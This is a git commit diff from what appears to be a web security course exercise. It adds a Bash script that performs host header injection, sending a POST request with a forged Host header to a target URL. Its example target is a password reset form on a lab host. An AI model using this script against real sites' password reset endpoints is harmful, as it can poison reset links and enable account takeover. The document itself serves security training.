e9b5c0a3fbe8ebc7de178d5176e8a8aaf53482b6
Fuad-hack <fuadkhanliyev@gmail.com>
2025-09-17 11:02:02 -0400

    Task - 1

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,2 +1,21 @@
 #!/bin/bash
-curl -s -X POST -H "Host: $1" -d "$3" "$2"
+# 1-host_header_injection.sh
+# İstifadə: ./1-host_header_injection.sh NEW_HOST TARGET_URL "form_field=value"
+
+# Parametrləri yoxlayırıq
+if [ "$#" -ne 3 ]; then
+  echo "Usage: $0 NEW_HOST TARGET_URL FORM_DATA"
+  echo 'Example: ./1-host_header_injection.sh new_host http://web0x00.hbtn/reset_password "email=test@test.hbtn"'
+  exit 1
+fi
+
+NEW_HOST="$1"
+TARGET_URL="$2"
+FORM_DATA="$3"
+
+# Curl ilə POST sorğusu göndəririk, host header-i dəyişdiririk
+curl -sS -L -X POST "$TARGET_URL" \
+  -H "Host: $NEW_HOST" \
+  -H "User-Agent: Mozilla/5.0" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "$FORM_DATA"
